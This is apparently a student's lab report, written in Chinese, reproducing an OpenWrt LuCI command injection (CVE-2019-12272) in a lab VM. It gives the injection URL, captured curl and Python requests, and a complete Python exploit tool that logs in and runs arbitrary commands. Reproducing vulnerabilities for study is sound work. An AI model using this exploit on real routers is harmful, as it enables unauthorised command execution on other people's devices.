# 实验四 移动通信安全概述
- [实验四 移动通信安全概述](#实验四-移动通信安全概述)
  - [~~口胡的~~实验目的与要求](#口胡的实验目的与要求)
  - [实验环境](#实验环境)
  - [实验流程](#实验流程)
    - [CVE-2019-1227漏洞环境安装](#cve-2019-1227漏洞环境安装)
    - [漏洞复现](#漏洞复现)
    - [漏洞利用](#漏洞利用)
      - [代码](#代码)
      - [代码编写](#代码编写)
  - [算是一些感想吧](#算是一些感想吧)
  - [参考](#参考)

## ~~口胡的~~实验目的与要求

- [x] 复现 CVE-2019-1227漏洞，编写第一个漏洞利用程序，初步了解移动通信安全。
- [x] （上课所讲案例）给自己的手机 SIM 卡设置一个新的 PIN 码



## 实验环境

- Kali 2020.3
- WSL2 Ubuntu 20.04 Server
- OpenWrt 15.05.1

## 实验流程

### CVE-2019-1227漏洞环境安装

安装代码与[第一章实验代码](https://github.com/CUCCS/2021-mis-public-LyuLumos/blob/ch0x01/ch0x01/code/setup-vm.sh)相同，仅需更改 `OpenWrt版本号` 与 `下载地址`。使用 `WSL2` 运行。

![](imgs/install19051.png)

其余配置同 [第一章实验OpenWrt环境](https://github.com/CUCCS/2021-mis-public-LyuLumos/tree/ch0x01/ch0x01#openwrt%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E5%AE%89%E8%A3%85)，非实验重点在此略过。

![](imgs/OpenWrt%20-%20LuCI.png)

### 漏洞复现

先使用管理员账号登录 LuCI ，再使用浏览器访问
`
http://192.168.189.189/cgi-bin/luci/;stok=6b45a6138759feb4cff4f0722d2ec0cb/admin/status/realtime/bandwidth_status/eth0$(ifconfig%3ecmd.txt)
`
触发漏洞，再访问 `http://192.168.189.189/cmd.txt` 获取上一步命令执行的结果。

![](imgs/OpenWrt%20-%20LuCI%20-%20cmdtxt.png)

### 漏洞利用

#### 代码
<!-- ```bash
find -name cmd.txt
rm ./www/cmd.txt
``` -->

通过 Chrome 浏览器开发者工具的 「Copy as curl」 功能，将漏洞复现请求复制为 `curl` 命令 ，然后通过第三方网站 将 `curl` 命令转换为 `Python requests` 代码 ，再稍加改动添加继续访问 `/cmd.txt` 并打印服务器响应，得到示例如下：

（我使用的浏览器为 `Microsoft Edge 90.0.818.62 (官方内部版本) (64 位)`，命令稍有不同，为 「Copy as cURL (bash)」）

```bash
curl 'http://192.168.189.189/cgi-bin/luci/;stok=6b45a6138759feb4cff4f0722d2ec0cb/admin/status/realtime/bandwidth_status/eth0$(ifconfig%3ecmd.txt)' \
  -H 'Connection: keep-alive' \
  -H 'Cache-Control: max-age=0' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.62' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7' \
  -H 'Cookie: sysauth=c0f9a58c63c6811f85d67df275511138' \
  --compressed \
  --insecure
```

![](imgs/copyCURL.png)

转换后的代码长这样：

```python
import requests

cookies = {
    'sysauth': 'c0f9a58c63c6811f85d67df275511138',
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.62',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
}

response = requests.get('http://192.168.189.189/cgi-bin/luci/;stok=6b45a6138759feb4cff4f0722d2ec0cb/admin/status/realtime/bandwidth_status/eth0$(ifconfig%3ecmd.txt)', headers=headers, cookies=cookies, verify=False)
```

#### 关键参数的获取

我们前文中 `stok`、`cookies['sysauth']`等参数都需要再模拟一次登录才能获取。

<!-- 我们使用 `Burp Suite` 进行抓包，使用「Copy as curl command」命令得到结果。 -->

<!-- ![](imgs/loginBurpSuiteSend.png)

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 192.168.189.189' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.189.189/cgi-bin/luci' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 39' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    --data-binary $'luci_username=root&luci_password=123456' \
    $'http://192.168.189.189/cgi-bin/luci'
``` -->

我们通过再一次模拟登录，搜索其中的 `method:POST` 信息，以相同的方式复制成 curl代码并在第三方网站中转换。

![](imgs/OpenWrt%20-%20Overview%20-%20LuCI%20-%20Login.png)

```python
import requests

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://192.168.189.189',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://192.168.189.189/cgi-bin/luci',
    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
}

data = {
  'luci_username': 'root',
  'luci_password': '123456'
}

response = requests.post('http://192.168.189.189/cgi-bin/luci', headers=headers, data=data, verify=False)
```

尽管并没有什么用但还是在 BurpSuite 里面重放了一次登录，确定了会返回我们需要的信息。

![](imgs/loginBurpSuiteSend.png)

#### 代码编写

代码编写的核心思想就是使代码看起来「工具化」，减少硬编码。

```py
#!/usr/bin/env python

import argparse
import requests
from urllib.parse import urlparse


class CVE_2019_12272:
    def __init__(self, args):
        self.host = args.host
        self.username = args.username
        self.password = args.password
        self.command = args.command
        self.cookies = ''
        self.stok = ''

        self.headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'http://{host}'.format(host=self.host),
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                          'Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,'
                      'application/signed-exchange;v=b3;q=0.9',
            'Referer': 'http://{host}/cgi-bin/luci'.format(host=self.host),
            'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        }

    def login(self):
        data = {
            'luci_username': '{username}'.format(username=self.username),
            'luci_password': '{passwd}'.format(passwd=self.password)
        }
        response = requests.post(self.headers['Referer'], headers=self.headers, data=data, verify=False,
                                 allow_redirects=False) # 302 意为 Moved Temporarily，必须ban掉重定向
        location = response.headers["Location"]
        self.stok = urlparse(location).params
        self.cookies = response.cookies

    def shell(self):
        url = 'http://{host}/cgi-bin/luci/;{stok}/admin/status/realtime/bandwidth_status/eth0$({cmd}%3ecmd.txt)'.format(
            host=self.host, stok=self.stok, cmd=self.command)
        response = requests.get(url, headers=self.headers, cookies=self.cookies, verify=False)
        if response.status_code >= 400:
            print("Build Shell Failed.")
        #     sys.exit(0)
        # else:
        #     print(response.content)

    def output(self):
        try:
            url = 'http://{host}/cmd.txt'.format(host=self.host)
            response = requests.get(url, verify=False)
            print(response.content.decode())
        except Exception as e:
            print("Error. ", e)


def run():
    parser = argparse.ArgumentParser(description='传入 参数 组')
    requiredNames = parser.add_argument_group('Required Named Arguments')
    requiredNames.add_argument('-a', '--host', help='ip host', required=True)  # -h 被--help占用
    requiredNames.add_argument('-u', '--username', help='username', required=True)
    requiredNames.add_argument('-p', '--password', help='password', required=True)
    requiredNames.add_argument('-c', '--command', help='command', required=True)
    args = parser.parse_args()
    temp = CVE_2019_12272(args)
    temp.login()
    temp.shell()
    temp.output()


if __name__ == '__main__':
    run()

```

在命令行里面调用

```bash
# argparse会把传递给它的选项视作为字符串，所以某些参数不加引号也可以
python main.py -a 192.168.189.189 -u root -p 123456 -c 'ifconfig'
```

![](imgs/answer.png)

## 算是一些感想吧

- CVE-2019-1227 其实漏洞有两个，直接把 `.../bandwidth_status/...` 替换成 `.../wireless_status/...` 可以直接达到对另一个漏洞的利用。
- 其实不用获取stok也行，直接访问 `...cgi-bin/luci/admin/status...` 不影响代码最终输出结果....
- 感觉写EXP比用鼠标酷炫多了(๑•̀ㅂ•́)و✧。
- 这次试验其实暴露出很多我个人的问题，比如自己写的时候一直登录不上LuCI，最后看了黄大的视频才解决。还有一个是感觉我写的代码不太优雅（args向self传参有点丑但是又不知道怎么改），python使用还不是很熟练，这方面需要加强。

## 参考

- [黄大的课程](https://www.bilibili.com/video/BV1rr4y1A7nz?p=100)
- [Python - argparse - 命令行选项、参数和子命令解析器](https://docs.python.org/zh-cn/3/library/argparse.html)
- [CVE-2019-12272 OpenWrt图形化管理界面LuCI命令注入分析](https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190710-lucirce.html)